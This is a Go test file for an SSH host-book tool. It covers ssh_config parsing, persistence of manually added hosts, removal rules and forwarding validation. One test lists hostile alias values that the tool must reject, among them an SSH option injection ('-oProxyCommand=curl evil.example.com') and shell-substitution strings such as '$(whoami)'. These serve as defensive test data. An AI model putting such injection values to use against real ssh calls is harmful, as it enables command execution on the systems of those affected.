package main

import (
	"errors"
	"os"
	"path/filepath"
	"testing"
)

func writeFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestParseSSHConfigSkipsPatternsAndKeepsDetail(t *testing.T) {
	dir := t.TempDir()
	cfg := writeFile(t, dir, "config", `
# a comment
Host code
  HostName 172.16.0.1
  User dev

Host wrt pi
  User root

Host *
  ServerAliveInterval 60

Host !nope
  HostName x

Host github.com-work
  HostName github.com
`)

	got := map[string]hostEntry{}
	for _, e := range parseSSHConfig(cfg) {
		got[e.Alias] = e
	}

	// `*` and `!nope` are matching rules, not machines.
	for _, bad := range []string{"*", "!nope", "nope"} {
		if _, ok := got[bad]; ok {
			t.Errorf("pattern %q was offered as a host", bad)
		}
	}
	// One Host line naming two aliases yields both, sharing the block's settings.
	if got["wrt"].User != "root" || got["pi"].User != "root" {
		t.Errorf("multi-alias Host line lost its User: %+v %+v", got["wrt"], got["pi"])
	}
	if got["code"].HostName != "172.16.0.1" || got["code"].User != "dev" {
		t.Errorf("code entry incomplete: %+v", got["code"])
	}
	if got["github.com-work"].HostName != "github.com" {
		t.Errorf("dotted alias not parsed: %+v", got["github.com-work"])
	}
}

func TestParseSSHConfigFollowsInclude(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "extra", "Host boxfromtheincludefile\n  HostName 10.0.0.9\n")
	main := writeFile(t, dir, "config", "Include extra\nHost code\n")

	var found bool
	for _, e := range parseSSHConfig(main) {
		if e.Alias == "boxfromtheincludefile" && e.HostName == "10.0.0.9" {
			found = true
		}
	}
	if !found {
		t.Fatal("Include was not followed")
	}
}

// An alias ends up as an argv element passed to ssh. argv already rules out a shell, but
// ssh still parses its own flags, so a leading dash must never survive into the book.
func TestAliasCannotLookLikeAnSSHFlag(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{EagerHosts: []string{"code"}}
	book := newHostBook(cfg, filepath.Join(dir, "none"), filepath.Join(dir, "hosts"))

	for _, bad := range []string{
		"-oProxyCommand=curl evil.example.com",
		"-vvv",
		"a host",
		"a;b",
		"$(whoami)",
		"",
	} {
		if err := book.Add(bad); err == nil {
			t.Errorf("accepted dangerous alias %q", bad)
		}
	}

	if err := book.Add("box2"); err != nil {
		t.Fatalf("rejected a reasonable alias: %v", err)
	}
	if !book.Known("box2") {
		t.Fatal("added host is not known")
	}
}

// Manual hosts are configuration, not runtime state: they must outlive a restart.
func TestManualHostsPersist(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{EagerHosts: []string{"code"}}
	file := filepath.Join(dir, "hosts")

	first := newHostBook(cfg, filepath.Join(dir, "none"), file)
	if err := first.Add("box2"); err != nil {
		t.Fatal(err)
	}

	reloaded := newHostBook(cfg, filepath.Join(dir, "none"), file)
	if !reloaded.Known("box2") {
		t.Fatal("manual host did not survive a reload")
	}

	if err := reloaded.Remove("box2"); err != nil {
		t.Fatal(err)
	}
	if newHostBook(cfg, filepath.Join(dir, "none"), file).Known("box2") {
		t.Fatal("removed host came back after a reload")
	}
}

func TestOnlyManualHostsCanBeRemoved(t *testing.T) {
	dir := t.TempDir()
	cfg := &Config{EagerHosts: []string{"code"}}
	sshCfg := writeFile(t, dir, "config", "Host discovered\n")
	book := newHostBook(cfg, sshCfg, filepath.Join(dir, "hosts"))

	if err := book.Remove("code"); err == nil {
		t.Error("an LG_HOSTS host was removable")
	}
	if err := book.Remove("discovered"); err == nil {
		t.Error("an ssh_config host was removable")
	}
}

// There is one authority level now, so the host book is the whole rule: anything it
// knows may be forwarded to, and anything it does not may not. A host that appears only
// in ssh_config is reachable — that was already true for the console, and the console is
// now the only caller there is.
func TestAnyKnownHostMayBeTargetedAndNothingElse(t *testing.T) {
	dir := t.TempDir()
	sshCfg := writeFile(t, dir, "config", "Host router\n  HostName 192.168.1.1\n")

	m, _ := testManager(t)
	m.book = newHostBook(m.cfg, sshCfg, filepath.Join(dir, "hosts"))
	m.masters["router"] = &fakeMaster{up: true}
	m.setHealthy("router", true)

	for _, known := range []string{"code", "router"} {
		r := &openReq{host: known, direction: dirLocal, remotePort: 8080}
		if err := m.validate(r); err != nil {
			t.Errorf("host %q is in the book but was refused: %v", known, err)
		}
	}

	unknown := &openReq{host: "nosuchbox", direction: dirLocal, remotePort: 8080}
	if err := m.validate(unknown); !errors.Is(err, errUnknownHost) {
		t.Fatalf("a host the book does not know: got %v, want errUnknownHost", err)
	}
}

// LG_HOSTS no longer means "reachable from the remote"; it means "connected at startup".
// It still sorts first, because those are the boxes in daily use.
func TestConfiguredHostsSortFirst(t *testing.T) {
	dir := t.TempDir()
	sshCfg := writeFile(t, dir, "config", "Host aaa\nHost zzz\n")
	cfg := &Config{EagerHosts: []string{"code"}}
	book := newHostBook(cfg, sshCfg, filepath.Join(dir, "hosts"))

	list := book.List()
	if len(list) < 3 {
		t.Fatalf("book is too small to be testing an order: %+v", list)
	}
	if list[0].Alias != "code" || list[0].Source != srcEager {
		t.Fatalf("the configured host does not come first: %+v", list)
	}
	for _, e := range list[1:] {
		if e.Source == srcEager {
			t.Fatalf("a second eager host appeared out of order: %+v", list)
		}
	}
}
